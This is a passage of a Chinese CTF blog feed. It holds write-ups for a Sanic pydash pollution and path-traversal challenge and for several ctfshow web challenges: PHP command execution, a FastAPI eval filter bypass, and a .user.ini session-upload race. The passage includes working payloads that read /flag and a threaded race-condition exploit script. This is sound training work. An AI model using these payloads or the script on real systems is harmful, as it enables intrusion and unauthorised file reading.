class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br></pre></td></tr></table></figure>

<p>他这个给了secret的路径</p>
<p>访问看看</p>
<p><img src="/imgs/12.png"></p>
<p>他说flag在app路由下，但是不知道他的名字 让我们找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure>

<p>还给了&#x2F;adminLook的路由</p>
<p><img src="/imgs/13.png"></p>
<p>我们传入恶意的key 比如part 这一步很重要到后面来解释</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>传入后我们发现多了两个文件</p>
<p><img src="/imgs/14.png"></p>
<p>有点不一样是因为靶机过期了重新打开了</p>
<p>我们先切换到&#x2F;tmp目录</p>
<p><img src="/imgs/15.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>#对base属性进行污染</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/4KDN4B&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>#打开目录功能</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问static&#x2F;4KDN4B..&#x2F;</p>
<p><img src="/imgs/16.png" alt="image-20240723165717529"></p>
<p>最后得到flag的名字直接访问就好</p>
<p>在把静态文件目录换成为根目录</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>之前知道flag在app路由下</p>
<p>&#x2F;static&#x2F;app&#x2F;45W698WqtsgQT1_flag</p>
<p><img src="/imgs/17.png"></p>
<p>接下来解释上面遗留的问题</p>
<p>那么为什么要恶意操作被后台日志记录呢？</p>
<p>这里复现完了我先把大佬的wp链接放出来，因为我水平有限，基本上就是照着大佬wp来进行复现</p>
<p>有点为了复现而复现的丑陋感，到后面我会慢慢补好基础的┭┮﹏┭┮</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p>
<p><a href="https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98">https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98</a></p>
<p><a href="https://blog.csdn.net/2301_79700060/article/details/140632405">https://blog.csdn.net/2301_79700060/article/details/140632405</a></p>
<p><a href="https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502</a></p>
<p>那么我们从</p>
<p>[<strong>gxngxngxn]</strong></p>
<p>大佬的文章来解释下</p>
<p>这套题目其实是ciscn2024 改的一道题目，先放链接</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p>国赛 sanic的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>&#x2F;admin 路由那块就是编码成八进制可以进入&#x2F;login,而且需要绕过waf大佬文章都讲了</p>
<p>直接看sanic那块污染链寻找</p>
<p>我们可以污染__file__然后进行任意文件读取，但是我们不知道flag的位置所以可以开启目录功能，有关的两个函数</p>
<p><strong>directory_view</strong> <strong>directory_handler</strong></p>
<p>只要我们将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件了</p>
<p>这个框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由</p>
<p>获得这个路由之后我们需要调用到DirectoryHandler里</p>
<p>我们可以用<strong>name_index</strong>方法发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view</p>
<p>从而实现污染达到列目录的目的</p>
<p>然后接下里就是污染directory</p>
<p>但是directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的?（这里我们需要知道tuple(元组：元组是 Python 中的一种数据结构，用于存储多个元素。与列表类似，元组也是一个序列，但与列表不同的是，元组是不可变的。这意味着元组一旦创建，其内容不能修改)）</p>
<p>所以不能直接污染directory </p>
<p>但在DirectoryHandler类中有Directory属性可以从这入手进入path对象parts的值最后是给了_parts这个属性发现是list</p>
<p>最终污染成&#x2F;就成功了</p>
<p>到时候要去复现下国赛ciscn毕竟那天坐了一天牢</p>
<p>到这还没完还没</p>
<p>我们继续看DirectoryHandler类中handle方法中的逻辑:</p>
<p>当我们开启列目录功能后，就会进入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(    <span class="variable language_">self</span>.directory / current, path, request.app.debug )</span><br></pre></td></tr></table></figure>

<p>解决上面遗留的问题就是从这开始发现这个目录路径是由Parts+current拼接出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.directory / current,path, request.app .debug</span><br></pre></td></tr></table></figure>

<p>目的就是让current变成.. 实现目录穿越</p>
<p>看下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current = path.strip(<span class="string">&quot;/&quot;</span>)[<span class="built_in">len</span>(<span class="variable language_">self</span>.base) :].strip(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从给定的路径中去除基本路径（`self.base`），然后返回剩余路径。首先，`path.strip(&quot;/&quot;)` 去除路径两端的斜杠，然后`[len(self.base):]` 取基本路径之后的部分，最后`.strip(&quot;/&quot;)` 再次去除剩余路径两端的斜杠</span><br><span class="line"></span><br><span class="line">#可以看到current的值就是由path和base两个值决定的</span><br></pre></td></tr></table></figure>

<p>self.base是可控的</p>
<p><strong>那么我们就得构造current的值</strong></p>
<p>关键就在于下面</p>
<p>所以实现目录穿越只要让path的值为static&#x2F;一个目录&#x2F; current值为..就好了</p>
<p>但是这个目录怎么来？</p>
<p><strong>file_or_directory</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以改变静态文件的默认路径</span><br><span class="line"></span><br><span class="line">我们只需要通过这个改变到其他目录，该目录下存在其他目录不就好了</span><br></pre></td></tr></table></figure>

<p>它可以改变static的默认路径</p>
<p>这就是上面为什么需要传入恶意的key,目的就是让日志记录，获得一个报错的目录</p>
<p>继续改变目录位置（上面改的是&#x2F;tmp）然后修改其base的值为自己报错的目录</p>
<p>就看实现目录穿越了</p>
<p>ile_or_directory只是改变它识别的路径，并不会改变</p>
<p>self.directory中parts的值，这个列目录的值依旧是默认的</p>
]]></content>
      <categories>
        <category>pollute</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow原谅杯</title>
    <url>/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>])?<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>]):<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>发现xbx可以rce</p>
<p>ls 发现</p>
<p>index.php yuanliang_4_xxx.zip</p>
<p>并且flag在&#x2F;目录里面</p>
<p>直接cat发现不行</p>
<p>我们ls &#x2F;bin目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin 目录是 Unix/Linux 系统中的一个重要目录,它存放着许多常用的可执行文件(二进制文件)。这些文件通常是系统管理员或普通用户经常使用的基本命令和应用程序</span><br></pre></td></tr></table></figure>

<p>最终发现sh rm ls 这三个命令可以执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh是一个轻量级的shell,相比于bash等更高级的shell,它提供了更基础的功能。但它仍然是许多系统管理任务的首选shell。</span><br></pre></td></tr></table></figure>

<p>明显让我们用sh来做题目</p>
<p>sh也可以像cat一样读取文件内容但是有一点不同</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# cat Gu0f3n.txt</span><br><span class="line">Gu0f3n</span><br><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# sh Gu0f3n.txt</span><br><span class="line">Gu0f3n.txt: line 1: Gu0f3n: command not found</span><br></pre></td></tr></table></figure>

<p>他会报错 command not found</p>
<p>因为当命令不被正常执行则会报错</p>
<p>这里我们可以用linux重定向错误输出</p>
<p>我们都知道在文件描述符中0，1，2 分表示标准输入，标准输出，标准错误输出</p>
<p>其次我们需要了解规律</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">2. 标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）  </span><br><span class="line">3. 文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp; </span><br><span class="line">4.  文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/weixin_29491885/article/details/111050189">https://blog.csdn.net/weixin_29491885/article/details/111050189</a></p>
<p>那么这道题目我们</p>
<p>用sh读取&#x2F;flag的内容将他的报错输出</p>
<p>sh &#x2F;flag 2&gt;%261</p>
<p>需要姜&amp;url编码为%26</p>
<p>paylod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xbx=sh%20/flag%202&gt;%261</span><br></pre></td></tr></table></figure>



<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>打开题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“你好”：“fastapi2”&#125;</span><br></pre></td></tr></table></figure>

<p>fast api2</p>
<p>首先就是了解fastapi2这个东西</p>
<p>FastAPI 是一个现代、快速（高性能）的 Web 框架，用于构建基于 Python 的 **<a href="https://apifox.com/apiskills/understanding-apis/">API</a>**。它是一个开源项目，基于 Starlette 和 Pydantic 库构建而成，提供了强大的功能和高效的性能。</p>
<p>在 FastAPI 中，<code>/docs</code> 路由提供了一个自动生成的交互式 API 文档界面。这是 FastAPI 的一个非常有用的特性，用于查看和测试 API 的各个端点</p>
<p>在更具题目给的提示</p>
<p>进入路由</p>
<p>发现三个函数</p>
<p>其中第二个calc</p>
<p>根据提示给的黑名单</p>
<p>我们展示全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/3.png"></p>
<p>发现可疑的变量youdontknow</p>
<p>展示这个变量发现一堆过滤得到关键词</p>
<p>我们用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">youdontknow.clear()</span><br></pre></td></tr></table></figure>

<p>clear掉过滤的关键词语</p>
<p>最后直接读flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/4.png"></p>
<h3 id="fastapi2-for-阿狸"><a href="#fastapi2-for-阿狸" class="headerlink" title="fastapi2 for 阿狸"></a>fastapi2 for 阿狸</h3><p><strong>和5一样</strong></p>
<p>clear掉</p>
<p>嗨嗨</p>
<h2 id="原谅6-web3"><a href="#原谅6-web3" class="headerlink" title="原谅6_web3"></a>原谅6_web3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line">(<span class="title function_ invoke__">waf_file</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">waf_content</span>(<span class="variable">$content</span>))?(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>)):<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>简单来说就是你输进去的文件不在waf的绕过里面就可以了</p>
<p>绕过的东西很多但是没有绕过**.user.ini**</p>
<p>.user.ini 文件是<strong>PHP 中用于配置特定目录的设置的特殊文件</strong>。 它类似于Apache 服务器中的 . htaccess 文件，但仅适用于PHP。 .user.ini 文件允许用户为特定目录定义PHP 配置指令，这些配置指令将在该目录及其所有子目录中的PHP 脚本执行时生效。</p>
<p><code>.user.ini</code> 文件的主要目的是为了允许非管理员用户自定义某些 PHP 配置选项，而不需要访问主 <code>php.ini</code> 文件。这样，不同的应用程序或用户可以在自己的目录中设置特定的 PHP 配置，而不影响整个服务器的配置。</p>
<p>这里的考点就是session和.user.ini的条件竞争</p>
<p>参考文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p><strong>auto_prepend_file 表示在php程序加载应用程序前加载指定的php文件</strong></p>
<p>GET：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=.user.ini</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/tmp/sess_Gu0f3n</span><br></pre></td></tr></table></figure>

<p>然后用下大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Gu0f3n&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://c41b9ab0-e1f5-4e05-b75c-a7ea64fa3d91.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat ./flag.php&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Gu0f3n.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">&quot;waf.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 第一步上传.user.ini文件，将我们的session文件内容添加到默认头</span></span><br><span class="line">        y4tacker = &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;auto_prepend_file=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url + <span class="string">&quot;?file=.user.ini&quot;</span>, data=y4tacker)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$flag=&#x27;ctfshow&#123;d78ac2f0-9b57-4159-a162-6b944e7b495b&#125;&#x27;;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1721961458;s:14:&quot;content_length&quot;;i:51487;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:10:&quot;Gu0f3n.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1721961458;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn2024的一些反思</title>
    <url>/2024/07/18/ciscn2024%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/</url>
